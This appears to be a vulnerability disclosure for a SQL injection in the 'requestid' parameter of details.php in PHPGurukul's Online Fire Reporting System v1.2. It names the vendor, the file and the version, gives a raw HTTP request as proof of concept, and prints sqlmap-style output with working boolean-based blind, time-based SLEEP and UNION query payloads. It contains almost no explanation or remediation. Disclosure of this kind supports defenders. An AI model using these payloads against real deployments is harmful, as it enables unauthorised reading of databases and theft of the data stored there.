# SQLi vulnerability in Online Fire Reporting System v1.2 of file details.php

**vender**:

- [PHPGurukul](https://vuldb.com/?vendor.phpgurukul)
- Online Fire Reporting System

**SoftLink**:

- [Online Fire Reporting System Project in PHP- PHPGurukul](https://phpgurukul.com/online-fire-reporting-system-using-php-and-mysql/)

**Vulnerable File**

- /details.php

**Version**

- V1.2

### POC

```http
GET /details.php?requestid=1 HTTP/1.1
Host: www.firereport.top
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cookie: PHPSESSID=vhqmp6o0p6p8lf7sscpqhrp6tf
```



```
---
Parameter: requestid (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: requestid=1' AND 9757=9757-- XFyx

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: requestid=1' AND (SELECT 8941 FROM (SELECT(SLEEP(5)))mVRH)-- nNfM

    Type: UNION query
    Title: Generic UNION query (NULL) - 10 columns
    Payload: requestid=1' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7171627671,0x454d6c566c6f7a674d774f51534561624a4c564269736e6b57447667466c63754c4f5a4b76517155,0x716a767171),NULL,NULL,NULL,NULL,NULL,NULL-- -
---
```



![image-20250531181031743](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505311810071.png)





